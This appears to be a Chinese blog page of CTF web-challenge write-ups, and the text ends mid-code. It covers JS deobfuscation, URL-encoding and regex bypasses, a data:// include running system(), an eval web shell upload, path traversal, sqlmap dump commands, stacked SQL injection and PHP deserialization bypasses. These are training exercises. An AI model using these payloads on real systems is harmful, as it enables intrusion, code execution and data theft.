alt="image-20240322175533400"></p><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><blockquote><p>小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ）</p></blockquote><p>F12 得到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dechiffre</span>(<span class="hljs-params">pass_enc</span>) &#123;<br>    <span class="hljs-keyword">var</span> pass = <span class="hljs-string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;<br>    <span class="hljs-keyword">var</span> tab = pass_enc.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    <span class="hljs-keyword">var</span> tab2 = pass.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    <span class="hljs-keyword">var</span> i, j, k, l = <span class="hljs-number">0</span>,<br>        m, n, o, p = <span class="hljs-string">&quot;&quot;</span>;<br>    i = <span class="hljs-number">0</span>;<br>    j = tab.<span class="hljs-property">length</span>;<br>    k = j + (l) + (n = <span class="hljs-number">0</span>);<br>    n = tab2.<span class="hljs-property">length</span>;<br>    <span class="hljs-keyword">for</span> (i = (o = <span class="hljs-number">0</span>); i &lt; (k = j = n); i++) &#123;<br>        o = tab[i - l];<br>        p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((o = tab2[i]));<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">5</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = (o = <span class="hljs-number">0</span>); i &lt; (k = j = n); i++) &#123;<br>        o = tab[i - l];<br>        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">5</span> &amp;&amp; i &lt; k - <span class="hljs-number">1</span>)<br>            p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((o = tab2[i]));<br>    &#125;<br>    p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(tab2[<span class="hljs-number">17</span>]);<br>    pass = p;<br>    <span class="hljs-keyword">return</span> pass;<br>&#125;<br><span class="hljs-title class_">String</span>[<span class="hljs-string">&quot;fromCharCode&quot;</span>](<span class="hljs-title function_">dechiffre</span>(<span class="hljs-string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));<br><br>h = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">prompt</span>(<span class="hljs-string">&#x27;Enter password&#x27;</span>);<br><span class="hljs-title function_">alert</span>(<span class="hljs-title function_">dechiffre</span>(h));<br></code></pre></td></tr></table></figure><p>乍一看要解密，其实没关系</p><p>取出 <code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<br>  <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<br>    ...<span class="hljs-string">&#x27;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&#x27;</span>.<span class="hljs-title function_">split</span>(<br>      <span class="hljs-string">&#x27;,&#x27;</span><br>    )<br>  )<br>)<br></code></pre></td></tr></table></figure><p><img src="/posts/df9d333d/image-20240322180631459.png" alt="image-20240322180631459"></p><p>Cyberpeace{} 包裹即可</p><ul><li>三个点（…）是展开运算符</li></ul><h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p>点开啥都没有</p><p>dirsearch 启动</p><p><img src="/posts/df9d333d/image-20240322192946012.png" alt="image-20240322192946012"></p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;admin&quot;</span>===<span class="hljs-variable">$_GET</span>[id]) &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$_GET</span>[id] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[id]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;admin&quot;</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>Can you anthenticate to this website?<br></code></pre></td></tr></table></figure><p>可以看出来是二次渲染</p><p><code>http://61.147.171.105:64045/?id=%2561dmin</code></p><p>浏览器请求的时候会把 <code>%25</code> 编码为 <code>%</code> </p><p>所以传上去的数据为 <code>%61dmin</code> </p><p><img src="/posts/df9d333d/image-20240322193654694.png" alt="image-20240322193654694"></p><h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h2><blockquote><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p></blockquote><p>报表中心可跳转</p><p><img src="/posts/df9d333d/image-20240322193823659.png" alt="image-20240322193823659"></p><p>没想到，看wp复现的</p><p>原来是个爆破</p><p><img src="/posts/df9d333d/image-20240322194648529.png" alt="image-20240322194648529"></p><p><img src="/posts/df9d333d/image-20240322194700663.png" alt="image-20240322194700663"></p><p><img src="/posts/df9d333d/image-20240322194710931.png" alt="image-20240322194710931"></p><h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>&#125;<br>?code=<br></code></pre></td></tr></table></figure><p>绕 <code>__wakeup</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">xctf</span>();<br><span class="hljs-variable">$a</span>-&gt;flag = <span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;&#125;</code></p><p>修改 xctf 后的数字为 1 以上即可</p><p><img src="/posts/df9d333d/image-20240322195352906.png" alt="image-20240322195352906"></p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p>tp 漏洞</p><p><img src="/posts/df9d333d/image-20240322195554478.png" alt="image-20240322195554478"></p><p>蚁剑连接，访问根目录即可</p><h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&quot;php://&quot;</span>)) &#123;<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php://&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$page</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了 <code>php://</code></p><p><code>?page=data://text/plain,&lt;?php system(&quot;cat%20fl4gisisish3r3.php&quot;);?&gt;</code></p><p><img src="/posts/df9d333d/image-20240322205016669.png" alt="image-20240322205016669"></p><h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>无过滤文件上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">2333</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传得到路径 <code>upload/1711112145.2.php</code></p><p><img src="/posts/df9d333d/image-20240322205701059.png" alt="image-20240322205701059"></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>F12</p><p><img src="/posts/df9d333d/image-20240322211334012.png" alt="image-20240322211334012"></p><ul><li>source.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li>hint.txt</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag not here, and flag in ffffllllaaaagggg<br></code></pre></td></tr></table></figure><p>其中</p><p><img src="/posts/df9d333d/image-20240322212105518.png" alt="image-20240322212105518"></p><p>传入 <code>page</code> 后面追加 <code>?</code></p><p>比如传入 <code>page=hint.php</code> 则相当于</p><p><code>mb_strpos(&quot;hint.php?&quot;,&quot;?&quot;)</code></p><p><code>mb_substr(&quot;hint.php&quot;, 0, &quot;hint.php&quot;)</code></p><p>所以我们可以手动传入带 <code>?</code> 的 page</p><p><code>source.php?/../../../../ffffllllaaaagggg</code></p><ul><li>include 的时候会把 <code>source.php?</code> 也看成目录，所以需要四个 <code>../</code></li><li>目录猜测是 <code>/var/www/html</code></li></ul><h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>sql注入</p><p>单引号写入，回车发现报错，猜测 sql注入</p><p>sqlmap启动</p><p><code>py sqlmap.py http://61.147.171.105:57816/ --forms --batch -dbs</code></p><p><img src="/posts/df9d333d/image-20240322214223337.png" alt="image-20240322214223337"></p><p><code>&gt;py sqlmap.py http://61.147.171.105:57816/ --forms --batch -D news --tables</code></p><p><img src="/posts/df9d333d/image-20240322214240694.png" alt="image-20240322214240694"></p><p><code>py sqlmap.py http://61.147.171.105:57816/ --forms --batch -D news -T secret_table --columns</code></p><p><img src="/posts/df9d333d/image-20240322214257497.png" alt="image-20240322214257497"></p><p><code>py sqlmap.py http://61.147.171.105:57816/ --forms --batch -D news -T secret_table -C &quot;fl4g&quot; --dump</code></p><p><img src="/posts/df9d333d/image-20240322214315229.png" alt="image-20240322214315229"></p><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化，过滤了 形如<code>O:123:</code>、<code>C:123: </code>的前缀</p><p>首先绕过 <code>__wakeup</code> </p><ul><li>在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本存在wakeup的漏洞。当反序列化中object的个数和之前的个数不等时，wakeup就会被绕过。</li></ul><p>其次是正则，这里可以在前缀的数字前加上 <code>+</code> 绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;fl4g.php&quot;</span>);<br><span class="hljs-variable">$a</span> =  <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// echo $a;</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;Demo&quot;:1&#x27;</span>, <span class="hljs-string">&#x27;&quot;Demo&quot;:2&#x27;</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// echo $a;</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>, <span class="hljs-string">&#x27;O:+4&#x27;</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// echo $a;</span><br><br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">// TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></code></pre></td></tr></table></figure><p><img src="/posts/df9d333d/image-20240322215129199.png" alt="image-20240322215129199"></p><h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>输入 <code>&#39;</code> 发现报错</p><p>尝试 <code>1&#39; union select 1,2,3 #</code></p><p>返回 <code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>尝试堆叠注入</p><p><code>1&#39;;show databases;#</code></p><p><img src="/posts/df9d333d/image-20240322220046279.png" alt="image-20240322220046279"></p><p><code>1&#39;;show tables ;#</code></p><p><img src="/posts/df9d333d/image-20240322220125992.png" alt="image-20240322220125992"></p><p><code>1&#39;;show columns from `1919810931114514`;#</code></p><p><img src="/posts/df9d333d/image-20240322220633717.png" alt="image-20240322220633717"></p><p>看了 wp，发现可以使用 <code>handler</code></p><p><code>1&#39;;handler `1919810931114514` open;handler `1919810931114514` read first;#</code></p><p><img src="/posts/df9d333d/image-20240322221227157.png" alt="image-20240322221227157"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$miwen</span>=<span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$_o</span>=<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$str</span>);<br>    <span class="hljs-comment">// echo $_o;</span><br>        <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_o</span>);<span class="hljs-variable">$_0</span>++)&#123;<br>       <br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_o</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$__</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$_c</span>)+<span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$__</span>);<br>        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;   <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_</span>)));<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   逆向加密算法，解密$miwen就是flag</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$miwen</span></span>)</span>&#123;<br>    <span class="hljs-variable">$_o</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$miwen</span>)));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_o</span>);<span class="hljs-variable">$_0</span>++)&#123;<br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title 